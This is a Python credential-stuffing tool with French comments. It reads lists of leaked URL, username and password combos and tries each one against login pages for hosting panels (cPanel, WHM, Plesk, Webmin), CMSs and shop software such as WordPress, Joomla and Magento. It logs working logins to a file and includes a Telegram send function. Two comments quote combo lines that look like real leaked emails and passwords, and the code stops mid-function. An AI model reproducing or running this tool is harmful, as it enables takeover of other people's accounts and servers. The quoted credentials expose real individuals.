import os
import re
import threading
import warnings
from multiprocessing.dummy import Pool as ThreadPool
from urllib.parse import urlparse
from typing import List, Dict, Optional, Tuple
import requests
from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
from colorama import init, Fore, Style
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
init(autoreset=True)

PARSER = "lxml"
try:
    import lxml
except ImportError:
    PARSER = "html.parser"

# ==================== NORMALISATION DES URLS ====================

def normalize_url(url: str) -> str:
    """Normalize URL to handle various input formats"""
    if not url:
        return url

    url = url.strip()
    
    # Handle credential formats
    if '#' in url and '@' in url:
        parts = url.split('#', 1)
        url_part = parts[0]
        cred_part = parts[1]
        
        if '@' in cred_part:
            username, password = cred_part.split('@', 1)
            return f"{url_part}#{username}@{password}"
    
    # Handle wp-login.php:username:password format
    if 'wp-login.php:' in url:
        parts = url.split('wp-login.php:', 1)
        url_part = parts[0] + 'wp-login.php'
        cred_part = parts[1]
        
        if ':' in cred_part:
            username, password = cred_part.split(':', 1)
            return f"{url_part}:{username}:{password}"
    
    # Ensure URL has scheme
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    # Clean up URL
    if url.endswith('/'):
        url = url[:-1]

    return url

def URLdomain(site: str) -> str:
    """Normalise l'URL - Version unifiée"""
    if site.startswith("http://"):
        site = site.replace("http://", "")
    elif site.startswith("https://"):
        site = site.replace("https://", "")
    
    pattern = re.compile('(.*)/')
    while re.findall(pattern, site):
        sitez = re.findall(pattern, site)
        site = sitez[0]
    return site

def URLdomain_full(site: str) -> str:
    """Normalise l'URL pour avoir le format complet"""
    if 'http://' not in site and 'https://' not in site:
        site = 'http://' + site
    if site[-1] != '/':
        site = site + '/'
    return site

def extract_domain(site: str) -> str:
    """Extrait le nom de domaine sans protocol"""
    if site.startswith("http://"):
        site = site.replace("http://", "")
    elif site.startswith("https://"):
        site = site.replace("https://", "")
    
    if 'www.' in site:
        site = site.replace("www.", "")
    
    site = site.rstrip()
    
    if '/' in site:
        site = site.split('/')[0]
    
    while site.endswith("/"):
        site = site[:-1]
    
    return site

def extract_username_from_url(url: str) -> str:
    """Extrait le nom d'utilisateur de l'URL"""
    url_no_protocol = url.replace('http://', '').replace('https://', '')
    if 'www.' in url_no_protocol:
        url_no_protocol = url_no_protocol.replace('www.', '')
    
    if '.' in url_no_protocol:
        return url_no_protocol.split('.')[0]
    return url_no_protocol

def clean_domain(domain: str) -> Optional[str]:
    """
    Nettoie et normalise un domaine en supprimant:
    - http://, https://
    - www.
    - Ports (:80, :443, etc)
    - Chemins (/path, /admin, etc)
    - Paramètres (?param=value)
    - Fragments (#section)
    - Espaces et caractères spéciaux
    """
    if not domain:
        return None
    
    domain = domain.strip().lower()
    
    # Remove protocols
    domain = re.sub(r'^https?://', '', domain)
    
    # Remove www prefix
    domain = re.sub(r'^www\.', '', domain)
    
    # Remove ports
    domain = re.sub(r':\d+', '', domain)
    
    # Remove everything after / (paths)
    domain = domain.split('/')[0]
    
    # Remove query parameters
    domain = domain.split('?')[0]
    
    # Remove fragments
    domain = domain.split('#')[0]
    
    # Remove trailing dots
    domain = domain.rstrip('.')
    
    # Validate domain format (basic)
    if not re.match(r'^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)+$', domain):
        return None
    
    return domain

def parse_combo_line(line: str) -> Optional[Tuple[str, str, str]]:
    """
    Parse une ligne de combo avec tous les formats supportés
    Retourne (url, username, password) ou None
    """
    if not line or line.startswith('#'):
        return None
    
    line = line.strip()
    url = None
    username = None
    password = None
    
    # CORRECTION: Format avec http:// ou https:// suivi de // (erreur commune)
    # Exemple: "https:////www.symbios.pk:imtiaz.028@gmail.com:syndicate900"
    if ':////' in line:
        line = line.replace(':////', '://')
    
    # CORRECTION: Format avec http: ou https: sans // (erreur commune)
    # Exemple: "http://youmagine.com/users/sign_in:trippitplanners199@gmail.com:Trippit@123*"
    if line.startswith('http:/') and not line.startswith('http://'):
        line = line.replace('http:/', 'http://')
    if line.startswith('https:/') and not line.startswith('https://'):
        line = line.replace('https:/', 'https://')
    
    # Format 1: url:username:password
    if ':' in line and line.count(':') >= 2:
        # CORRECTION: Trouver la bonne séparation pour les URLs avec chemins
        # Chercher le premier : après le protocole
        first_colon = line.find(':')
        if first_colon > 0 and (line[:first_colon].startswith('http') or line[:first_colon].startswith('https')):
            # Trouver le 2ème : pour séparer username
            second_colon = line.find(':', first_colon + 1)
            if second_colon > 0:
                url = line[:second_colon]
                rest = line[second_colon + 1:]
                if ':' in rest:
                    username, password = rest.split(':', 1)
                else:
                    username = rest
                    password = ''
            else:
                parts = line.split(':', 2)
                if len(parts) >= 3:
                    url, username, password = parts[0], parts[1], parts[2]
        else:
            parts = line.split(':', 2)
            if len(parts) >= 3:
                url, username, password = parts[0], parts[1], parts[2]
    
    # Format 2: url|username|password
    elif '|' in line and line.count('|') >= 2:
        parts = line.split('|', 2)
        url, username, password = parts[0], parts[1], parts[2]
    
    # Format 3: url#username@password
    elif '#' in line and '@' in line:
        parts = line.split('#', 1)
        url = parts[0]
        creds = parts[1].split('@', 1)
        if len(creds) == 2:
            username, password = creds[0], creds[1]
    
    # Format 4: /path.php:username:password
    elif '/wp-login.php:' in line or '/install.php:' in line:
        if '/wp-login.php:' in line:
            parts = line.split('/wp-login.php:', 1)
            url = parts[0] + '/wp-login.php'
        else:
            parts = line.split('/install.php:', 1)
            url = parts[0] + '/install.php'
        
        creds = parts[1].split(':', 1)
        if len(creds) >= 2:
            username = creds[0]
            password = creds[1] if len(creds) > 1 else ''
    
    # Format 5: url:username:password avec des chemins spécifiques
    elif any(x in line for x in ['wp-login.php', 'install.php', 'admin', 'administrator']):
        for path in ['/wp-login.php', '/install.php', '/admin', '/administrator']:
            if path in line:
                parts = line.split(path, 1)
                url = parts[0] + path
                creds_part = parts[1].lstrip(':').lstrip('|')
                if ':' in creds_part:
                    creds = creds_part.split(':', 1)
                    username, password = creds[0], creds[1] if len(creds) > 1 else ''
                elif '|' in creds_part:
                    creds = creds_part.split('|', 1)
                    username, password = creds[0], creds[1] if len(creds) > 1 else ''
                break
    
    # Si on a trouvé une URL mais pas de username/password, vérifier si le format est différent
    if url and not username and ':' in line:
        # Essayer d'extraire depuis la ligne complète
        url_part = url
        rest = line[len(url_part):].lstrip(':').lstrip('|')
        if ':' in rest:
            username, password = rest.split(':', 1)
        elif '|' in rest:
            username, password = rest.split('|', 1)
    
    if not all([url, username, password]):
        return None
    
    # CORRECTION: Nettoyer l'URL des doubles slashes
    url = re.sub(r'(https?://)/+', r'\1/', url)
    
    # Normaliser l'URL
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    return (url, username, password)

def clean_combo_on_the_fly(combo_line: str) -> Optional[str]:
    """
    Nettoie une ligne de combo à la volée pendant le test
    Format: domain:username:password
    Nettoie uniquement la partie domaine, garde username et password intacts
    """
    if not combo_line or ':' not in combo_line:
        return None
    
    # CORRECTION: Nettoyer les doubles slashes avant le parsing
    cleaned_line = combo_line.strip()
    if ':////' in cleaned_line:
        cleaned_line = cleaned_line.replace(':////', '://')
    if cleaned_line.startswith('http:/') and not cleaned_line.startswith('http://'):
        cleaned_line = cleaned_line.replace('http:/', 'http://')
    if cleaned_line.startswith('https:/') and not cleaned_line.startswith('https://'):
        cleaned_line = cleaned_line.replace('https:/', 'https://')
    
    # Utiliser parse_combo_line pour extraire correctement
    parsed = parse_combo_line(cleaned_line)
    if parsed:
        url, username, password = parsed
        # Extraire le domaine de l'URL
        domain_match = re.search(r'https?://([^/:]+)', url)
        if domain_match:
            domain = domain_match.group(1)
            domain = clean_domain(domain)
            if domain:
                return f"{domain}:{username}:{password}"
    
    # Fallback à la méthode originale
    parts = cleaned_line.split(':', 2)
    if len(parts) < 3:
        return None
    
    raw_domain, username, password = parts[0], parts[1], parts[2] if len(parts) > 2 else ''
    
    # Nettoyer le domaine des protocoles mal formatés
    raw_domain = re.sub(r'^https?://+', '', raw_domain)
    raw_domain = re.sub(r'^https?:/+', '', raw_domain)
    
    cleaned_domain = clean_domain(raw_domain)
    
    if not cleaned_domain:
        return None
    
    return f"{cleaned_domain}:{username}:{password}"

def normalize_target_url(url: str, base_url: str = None) -> str:
    """Normalise l'URL cible pour les tests"""
    if not url:
        return url
    
    # CORRECTION: Nettoyer les doubles slashes
    url = re.sub(r'(https?://)/+', r'\1/', url)
    
    url = normalize_url(url)
    
    # S'assurer que l'URL a un schéma
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    # Nettoyer les slashes en trop
    url = url.rstrip('/')
    
    return url

def read_targets(file_path: str) -> List[Dict[str, str]]:
    """Read and parse target URLs with credentials - Version améliorée"""
    targets = []
    try:
        encodings = ['utf-8', 'latin-1', 'ascii', 'cp1252', 'utf-8-sig']
        
        for encoding in encodings:
            try:
                with open(file_path, 'r', encoding=encoding) as f:
                    for line_num, line in enumerate(f, 1):
                        line = line.strip()
                        if not line or line.startswith('#'):
                            continue
                        
                        line = re.sub(r'[^\x00-\x7F]+', '', line)
                        
                        # Nettoyer les doubles slashes
                        if ':////' in line:
                            line = line.replace(':////', '://')
                        if line.startswith('http:/') and not line.startswith('http://'):
                            line = line.replace('http:/', 'http://')
                        if line.startswith('https:/') and not line.startswith('https://'):
                            line = line.replace('https:/', 'https://')
                        
                        # Utiliser la fonction de parsing unifiée
                        parsed = parse_combo_line(line)
                        
                        if parsed:
                            url, username, password = parsed
                            
                            # Déterminer base_url
                            if '/wp-login.php' in url:
                                base_url = url.replace('/wp-login.php', '')
                            elif '/wp-admin' in url:
                                base_url = url.split('/wp-admin')[0]
                            elif '/install.php' in url:
                                base_url = url.replace('/install.php', '')
                            else:
                                base_url = url
                                if not url.endswith('/wp-login.php'):
                                    if url.endswith('/'):
                                        url = url[:-1]
                                    url = url + '/wp-login.php'
                            
                            targets.append({
                                'url': normalize_target_url(url),
                                'username': username,
                                'password': password,
                                'base_url': normalize_target_url(base_url),
                                'has_creds': True
                            })
                        else:
                            # URL without credentials
                            url = line
                            if not url.startswith(('http://', 'https://')):
                                url = 'http://' + url
                            
                            base_url = url
                            if not url.endswith('/wp-login.php'):
                                if url.endswith('/'):
                                    url = url[:-1]
                                url = url + '/wp-login.php'
                            
                            targets.append({
                                'url': normalize_target_url(url),
                                'username': None,
                                'password': None,
                                'base_url': normalize_target_url(base_url),
                                'has_creds': False
                            })
                
                break  # Successfully read the file
            except UnicodeDecodeError:
                continue
            except Exception as e:
                print(f"❌ Error parsing line {line_num}: {str(e)}")
                continue
        
        return targets
    except Exception as e:
        print(f"❌ Error reading targets: {str(e)}")
        return []

# ==================== TELEGRAM CONFIGURATION ====================
TELEGRAM_BOT_TOKEN = ""
TELEGRAM_CHAT_ID = ""
# ================================================================

THEME = {
    'BANNER_ART': Fore.YELLOW, 'BANNER_BORDER': Fore.CYAN,
    'BANNER_TITLE': Style.BRIGHT + Fore.YELLOW, 'BANNER_VERSION': Fore.GREEN,
    'BANNER_EXTRA': Fore.WHITE, 'PROMPT': Fore.YELLOW, 'ERROR': Fore.RED,
    'INFO': Fore.CYAN, 'SUCCESS': Fore.GREEN, 'STATS_HEADER': Fore.GREEN,
    'STATS_SERVICE': Fore.CYAN, 'STATS_TOTAL': Style.BRIGHT + Fore.WHITE,
    'CHECKING': Fore.MAGENTA, 'FAILED': Fore.RED, 'ACCESS_OK': Fore.GREEN, 'ACCESS_NO': Fore.RED
}

process_lock = threading.Lock()
OUTPUT_FOLDER = 'output'
CORRECT_FOLDER = 'Correct'

# Liste complète des services avec leurs noms
SERVICE_NAMES = {
    # Panels d'hébergement
    'WHM': 'WHM', 'CPANEL': 'cPanel', 'WEBMAIL': 'Webmail', 'PLEX': 'Plex',
    'WEBMIN': 'Webmin', 'VIRTUALMIN': 'Virtualmin', 'DIRECTADMIN': 'DirectAdmin',
    'PLESK': 'Plesk', 'ISPCP': 'ispCP', 'VESTACP': 'VestaCP', 'CENTOS_WEBPANEL': 'CentOS WebPanel',
    
    # CMS Populaires
    'WORDPRESS': 'WordPress', 'JOOMLA': 'Joomla', 'DRUPAL': 'Drupal',
    'MAGENTO': 'Magento', 'PRESTASHOP': 'PrestaShop', 'OPENCART': 'OpenCart',
    
    # Nouveaux CMS
    'SHOPIFY': 'Shopify', 'WOOCOMMERCE': 'WooCommerce', 'BIGCOMMERCE': 'BigCommerce',
    'WIX': 'Wix', 'SQUARESPACE': 'Squarespace', 'WEBFLOW': 'Webflow',
    'GHOST': 'Ghost', 'TYPEO3': 'Typo3', 'CONTAO': 'Contao', 'NEOS': 'Neos',
    'BACKDROP': 'Backdrop', 'CONCRETE5': 'Concrete5', 'CRAFT': 'Craft CMS',
    'STATAMIC': 'Statamic', 'KIRBY': 'Kirby', 'GRAV': 'Grav', 'PYROCMS': 'PyroCMS',
    'PAGEFACTORY': 'PageFactory', 'SILVERSTRIPE': 'SilverStripe', 'MODX': 'MODX',
    'TEXTPATTERN': 'Textpattern', 'EXPRESSIONENGINE': 'ExpressionEngine',
    'CMSMADESIMPLE': 'CMS Made Simple', 'IMPRESS_PAGES': 'ImpressPages',
    
    # Frameworks PHP
    'LARAVEL': 'Laravel', 'SYMFONY': 'Symfony', 'CODEIGNITER': 'CodeIgniter',
    'CAKEPHP': 'CakePHP', 'YII': 'Yii', 'ZEND': 'Zend', 'PHALCON': 'Phalcon',
    'FUELPHP': 'FuelPHP', 'SLIM': 'Slim', 'LUMEN': 'Lumen',
    
    # E-commerce
    'WOOCOMMERCE_ALT': 'WooCommerce', 'SHOPWARE': 'Shopware', 'OXID': 'OXID eShop',
    'ZENCART': 'ZenCart', 'ABANTECART': 'AbanteCart', 'THIRTY_BEES': 'Thirty Bees',
    
    # Forums et communautés
    'PHPBB': 'phpBB', 'SMF': 'Simple Machines Forum', 'MYBB': 'MyBB',
    'VBBULLETIN': 'vBulletin', 'XENFORO': 'XenForo', 'FLUXBB': 'FluxBB',
    'DISCUZ': 'Discuz', 'IPBOARD': 'IP.Board', 'BURNINGBOARD': 'WoltLab',
    
    # Wikis
    'MEDIAWIKI': 'MediaWiki', 'DOCUWIKI': 'DokuWiki', 'PMWIKI': 'PmWiki',
    'TWIKI': 'TikiWiki', 'WIKIPATTERN': 'WikiPattern',
    
    # Gestion de contenu
    'BLOGSPOT': 'Blogspot', 'TUMBLR': 'Tumblr', 'MEDIUM': 'Medium',
    
    # Autres services
    'FLASK': 'Flask', 'FTP': 'FTP', 'SSH': 'SSH', 'MYSQL': 'MySQL',
    'POSTGRESQL': 'PostgreSQL', 'REDIS': 'Redis', 'MONGODB': 'MongoDB',
    'JENKINS': 'Jenkins', 'GITLAB': 'GitLab', 'GITHUB': 'GitHub',
    'BITBUCKET': 'Bitbucket', 'JIRA': 'Jira', 'CONFLUENCE': 'Confluence',
    'WORDPRESS_ADMIN': 'WordPress Admin', 'PHP_MY_ADMIN': 'phpMyAdmin',
    'ADMINER': 'Adminer', 'ROCKETCHAT': 'Rocket.Chat', 'MATTERMOST': 'Mattermost',
    'NEXTCLOUD': 'Nextcloud', 'OWNCLOUD': 'OwnCloud', 'SEAFILE': 'Seafile'
}

GLOBAL_RESULTS_FILE = os.path.join(OUTPUT_FOLDER, 'all_success_results.txt')

# Compteur pour les lignes invalides
invalid_lines_count = 0
invalid_lines_lock = threading.Lock()
success_count_lock = threading.Lock()
total_success_count = 0

def send_telegram_message(message):
    """Send message via Telegram bot"""
    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or TELEGRAM_CHAT_ID == "YOUR_CHAT_ID_HERE":
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML',
            'disable_web_page_preview': True
        }
        requests.post(url, data=payload, timeout=5)
    except Exception:
        pass

def save_to_global_file(line):
    """Save in real-time to global file"""
    with process_lock:
        try:
            os.makedirs(OUTPUT_FOLDER, exist_ok=True)
            with open(GLOBAL_RESULTS_FILE, 'a', encoding='utf-8') as f:
                f.write(line + '\n')
        except Exception:
            pass

def save_invalid_line(original_line, reason):
    """Save invalid lines to a file for reference"""
    with invalid_lines_lock:
        global invalid_lines_count
        invalid_lines_count += 1
        try:
            os.makedirs(OUTPUT_FOLDER, exist_ok=True)
            invalid_file = os.path.join(OUTPUT_FOLDER, 'invalid_lines.txt')
            with open(invalid_file, 'a', encoding='utf-8') as f:
                f.write(f"[{reason}] {original_line}\n")
        except Exception:
            pass

def print_check_status(domain, username, password, service, status, message=""):
    """Display check status in real-time on terminal with desired format"""
    with process_lock:
        if status == "checking":
            print(f"{THEME['CHECKING']}domain: {domain} | username: {username} | password: {password} | checking: {service}...")
        elif status == "success":
            print(f"{THEME['ACCESS_OK']}domain: {domain} | username: {username} | password: {password} | service: {service} | access: OK{Style.RESET_ALL}")
        elif status == "failed":
            print(f"{THEME['ACCESS_NO']}domain: {domain} | username: {username} | password: {password} | service: {service} | access: NOT FOUND{Style.RESET_ALL}")
        elif status == "error":
            print(f"{THEME['ERROR']}domain: {domain} | username: {username} | password: {password} | service: {service} | access: ERROR (connection failed){Style.RESET_ALL}")
        elif status == "invalid":
            print(f"{THEME['ERROR']}domain: {domain} | username: {username} | password: {password} | status: INVALID FORMAT - SKIPPED{Style.RESET_ALL}")

class LoginChecker:
    def __init__(self, combo_line):
        self.original_combo = combo_line.strip()
        # Nettoyer la ligne à la volée
        self.cleaned_combo = clean_combo_on_the_fly(self.original_combo)

    def run_checks(self):
        # Si le nettoyage a échoué, ignorer cette ligne
        if not self.cleaned_combo:
            save_invalid_line(self.original_combo, "Invalid domain format")
            # Afficher l'erreur
            parts = self.original_combo.split(':', 2)
            if len(parts) >= 3:
                domain, user, password = parts[0], parts[1], parts[2] if len(parts) > 2 else ''
                print_check_status(domain, user, password, "N/A", "invalid")
            else:
                print(f"{THEME['ERROR']}Invalid line format (skipped): {self.original_combo[:50]}...")
            return
        
        try:
            parts = self.cleaned_combo.split(':')
            if len(parts) < 3: return
            domain, user, password = parts[0], parts[1], ':'.join(parts[2:])
            
            # Normaliser le domaine
            domain = clean_domain(domain)
            if not domain:
                return
            
            # Panels d'hébergement
            self.check_cpanel_whm(domain, user, password, SERVICE_NAMES['WHM'], 2087)
            self.check_cpanel_whm(domain, user, password, SERVICE_NAMES['CPANEL'], 2083)
            self.check_cpanel_whm(domain, user, password, SERVICE_NAMES['WEBMAIL'], 2096)
            self.check_plesk(domain, user, password)
            self.check_directadmin(domain, user, password)
            self.check_webmin(domain, user, password)
            self.check_vestacp(domain, user, password)
            self.check_centos_webpanel(domain, user, password)
            
            # CMS Principaux
            self.check_wordpress(domain, user, password)
            self.check_joomla(domain, user, password)
            self.check_drupal(domain, user, password)
            self.check_magento(domain, user, password)
            self.check_prestashop(domain, user, password)
            self.check_opencart(domain, user, password)
            
            # Nouveaux CMS
            self.check_shopify(domain, user, password)
            self.check_woocommerce(domain, user, password)
            self.check_ghost(domain, user, password)
            self.check_typo3(domain, user, password)
            self.check_concrete5(domain, user, password)
            self.check_craftcms(domain, user, password)
            self.check_modx(domain, user, password)
            self.check_silverstripe(domain, user, password)
            
            # Frameworks
            self.check_laravel(domain, user, password)
            self.check_symfony(domain, user, password)
            self.check_codeigniter(domain, user, password)
            self.check_cakephp(domain, user, password)
            self.check_yii(domain, user, password)
            
            # Forums
            self.check_phpbb(domain, user, password)
            self.check_smf(domain, user, password)
            self.check_mybb(domain, user, password)
            self.check_xenforo(domain, user, password)
            
            # Wikis
            self.check_mediawiki(domain, user, password)
            self.check_dokuwiki(domain, user, password)
            
            # Autres services
            self.check_flask(domain, user, password)
            self.check_ftp(domain, user, password)
            self.check_phpmyadmin(domain, user, password)
            self.check_nextcloud(domain, user, password)
            self.check_gitlab(domain, user, password)
            self.check_jenkins(domain, user, password)
            
        except Exception as e:
            pass

    def check_cpanel_whm(self, domain, user, password, service_name, port):
        try:
            print_check_status(domain, user, password, service_name, "checking")
            r = requests.post(f"https://{domain}:{port}/login/?login_only=1", data={'user': user, 'pass': password}, verify=False, timeout=10)
            if r.status_code == 200 and '"status":1' in r.text and '"security_token"' in r.text:
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except requests.exceptions.RequestException:
            print_check_status(domain, user, password, service_name, "error")

    def check_plesk(self, domain, user, password):
        service_name = SERVICE_NAMES['PLESK']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}:8443/login_up.php"
            r = requests.post(login_url, data={'login_name': user, 'passwd': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'redirect' in r.text:
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_directadmin(self, domain, user, password):
        service_name = SERVICE_NAMES['DIRECTADMIN']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}:2222/CMD_LOGIN"
            r = requests.post(login_url, data={'username': user, 'password': password}, verify=False, timeout=10, allow_redirects=False)
            if r.status_code in [301, 302]:
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_webmin(self, domain, user, password):
        service_name = SERVICE_NAMES['WEBMIN']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}:10000/session_login.cgi"
            r = requests.post(login_url, data={'user': user, 'pass': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'redirect' in r.text:
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_vestacp(self, domain, user, password):
        service_name = SERVICE_NAMES['VESTACP']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}:8083/login/"
            r = requests.post(login_url, data={'user': user, 'password': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'error' not in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_centos_webpanel(self, domain, user, password):
        service_name = SERVICE_NAMES['CENTOS_WEBPANEL']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}:2031/login/index.php"
            r = requests.post(login_url, data={'username': user, 'password': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'dashboard' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_wordpress(self, domain, user, password):
        service_name = SERVICE_NAMES['WORDPRESS']
        for protocol in ['https', 'http']:
            try:
                print_check_status(domain, user, password, service_name, "checking")
                login_url = f"{protocol}://{domain}/wp-login.php"
                with requests.Session() as s:
                    s.headers.update({'User-Agent': 'Mozilla/5.0'})
                    s.get(login_url, verify=False, timeout=10)
                    payload = {'log': user, 'pwd': password, 'wp-submit': 'Log In', 'testcookie': '1'}
                    r = s.post(login_url, data=payload, verify=False, timeout=10, allow_redirects=False)
                    if r.status_code in [301, 302, 303] and 'wp-admin' in r.headers.get('Location', ''):
                        self.handle_success(service_name, domain, user, password)
                        return
                    else:
                        print_check_status(domain, user, password, service_name, "failed")
            except requests.exceptions.RequestException:
                print_check_status(domain, user, password, service_name, "error")
                continue

    def check_joomla(self, domain, user, password):
        service_name = SERVICE_NAMES['JOOMLA']
        for protocol in ['https', 'http']:
            try:
                print_check_status(domain, user, password, service_name, "checking")
                admin_url = f"{protocol}://{domain}/administrator/"
                with requests.Session() as s:
                    s.headers.update({'User-Agent': 'Mozilla/5.0'})
                    get_r = s.get(admin_url, verify=False, timeout=10)
                    if get_r.status_code != 200: 
                        print_check_status(domain, user, password, service_name, "failed")
                        continue
                    token = re.search(r'name="([a-f0-9]{32})"', get_r.text)
                    if not token: 
                        print_check_status(domain, user, password, service_name, "failed")
                        continue
                    payload = {'username': user, 'passwd': password, 'option': 'com_login', 'task': 'login', token.group(1): '1'}
                    s.post(f"{admin_url}index.php", data=payload, verify=False, timeout=10)
                    final_get_r = s.get(admin_url, verify=False, timeout=10)
                    if any(k in final_get_r.text for k in ['task=logout', 'com_login.logout']):
                        self.handle_success(service_name, domain, user, password, admin_url)
                        return
                    else:
                        print_check_status(domain, user, password, service_name, "failed")
            except requests.exceptions.RequestException:
                print_check_status(domain, user, password, service_name, "error")
                continue

    def check_drupal(self, domain, user, password):
        service_name = SERVICE_NAMES['DRUPAL']
        for protocol in ['https', 'http']:
            try:
                print_check_status(domain, user, password, service_name, "checking")
                login_url = f"{protocol}://{domain}/user/login"
                with requests.Session() as s:
                    s.headers.update({'User-Agent': 'Mozilla/5.0'})
                    get_r = s.get(login_url, verify=False, timeout=10)
                    if get_r.status_code != 200: 
                        print_check_status(domain, user, password, service_name, "failed")
                        continue
                    soup = BeautifulSoup(get_r.text, PARSER)
                    form_build_id = soup.find('input', {'name': 'form_build_id'})
                    form_id = soup.find('input', {'name': 'form_id'})
                    if not all([form_build_id, form_id]): 
                        print_check_status(domain, user, password, service_name, "failed")
                        continue
                    payload = {'name': user, 'pass': password, 'form_build_id': form_build_id['value'], 'form_id': form_id['value'], 'op': 'Log in'}
                    post_r = s.post(login_url, data=payload, verify=False, timeout=10)
                    if 'Log out' in post_r.text or 'user/logout' in post_r.text:
                        self.handle_success(service_name, domain, user, password, login_url)
                        return
                    else:
                        print_check_status(domain, user, password, service_name, "failed")
            except requests.exceptions.RequestException:
                print_check_status(domain, user, password, service_name, "error")
                continue

    def check_magento(self, domain, user, password):
        service_name = SERVICE_NAMES['MAGENTO']
        for protocol in ['https', 'http']:
            try:
                print_check_status(domain, user, password, service_name, "checking")
                admin_path = 'admin'
                login_url = f"{protocol}://{domain}/{admin_path}"
                with requests.Session() as s:
                    s.headers.update({'User-Agent': 'Mozilla/5.0'})
                    get_r = s.get(login_url, verify=False, timeout=15)
                    if get_r.status_code != 200: 
                        print_check_status(domain, user, password, service_name, "failed")
                        continue
                    soup = BeautifulSoup(get_r.text, PARSER)
                    form_key = soup.find('input', {'name': 'form_key'})
                    if not form_key: 
                        print_check_status(domain, user, password, service_name, "failed")
                        continue
                    payload = {'login[username]': user, 'login[password]': password, 'form_key': form_key['value']}
                    post_r = s.post(get_r.url, data=payload, verify=False, timeout=15)
                    if 'admin/dashboard' in post_r.text or 'data-role="logout"' in post_r.text:
                        self.handle_success(service_name, domain, user, password, login_url)
                        return
                    else:
                        print_check_status(domain, user, password, service_name, "failed")
            except requests.exceptions.RequestException:
                print_check_status(domain, user, password, service_name, "error")
                continue

    def check_prestashop(self, domain, user, password):
        service_name = SERVICE_NAMES['PRESTASHOP']
        for protocol in ['https', 'http']:
            try:
                print_check_status(domain, user, password, service_name, "checking")
                admin_path = 'admin123'
                login_url = f"{protocol}://{domain}/{admin_path}"
                with requests.Session() as s:
                    s.headers.update({'User-Agent': 'Mozilla/5.0'})
                    get_r = s.get(login_url, verify=False, timeout=15, allow_redirects=True)
                    if get_r.status_code != 200: 
                        print_check_status(domain, user, password, service_name, "failed")
                        continue
                    final_url = get_r.url
                    token = re.search(r'_token=([a-zA-Z0-9_-]+)', final_url)
                    if not token: 
                        print_check_status(domain, user, password, service_name, "failed")
                        continue
                    payload = {'email': user, 'passwd': password, '_token': token.group(1), 'submitLogin': '1'}
                    post_r = s.post(final_url, data=payload, verify=False, timeout=15, allow_redirects=False)
                    if post_r.status_code in [301, 302, 303] and 'logout' in post_r.headers.get('Location', ''):
                        self.handle_success(service_name, domain, user, password, login_url.replace(admin_path, 'admin'))
                        return
                    else:
                        print_check_status(domain, user, password, service_name, "failed")
            except requests.exceptions.RequestException:
                print_check_status(domain, user, password, service_name, "error")
                continue

    def check_opencart(self, domain, user, password):
        service_name = SERVICE_NAMES['OPENCART']
        for protocol in ['https', 'http']:
            try:
                print_check_status(domain, user, password, service_name, "checking")
                admin_path = 'admin'
                login_url = f"{protocol}://{domain}/{admin_path}/"
                with requests.Session() as s:
                    s.headers.update({'User-Agent': 'Mozilla/5.0'})
                    get_r = s.get(login_url, verify=False, timeout=10)
                    if get_r.status_code != 200: 
                        print_check_status(domain, user, password, service_name, "failed")
                        continue
                    token = re.search(r'user_token=([a-f0-9]+)', get_r.text)
                    if not token: 
                        print_check_status(domain, user, password, service_name, "failed")
                        continue
                    post_url = f"{login_url}index.php?route=common/login&user_token={token.group(1)}"
                    payload = {'username': user, 'password': password}
                    post_r = s.post(post_url, data=payload, verify=False, timeout=10, allow_redirects=False)
                    if post_r.status_code in [301, 302, 303] and 'common/dashboard' in post_r.headers.get('Location', ''):
                        self.handle_success(service_name, domain, user, password, login_url)
                        return
                    else:
                        print_check_status(domain, user, password, service_name, "failed")
            except requests.exceptions.RequestException:
                print_check_status(domain, user, password, service_name, "error")
                continue

    def check_shopify(self, domain, user, password):
        service_name = SERVICE_NAMES['SHOPIFY']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/admin/auth/login"
            r = requests.post(login_url, data={'login': user, 'password': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'dashboard' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_woocommerce(self, domain, user, password):
        service_name = SERVICE_NAMES['WOOCOMMERCE']
        try:
            print_check_status(domain, user, password, service_name, "checking")
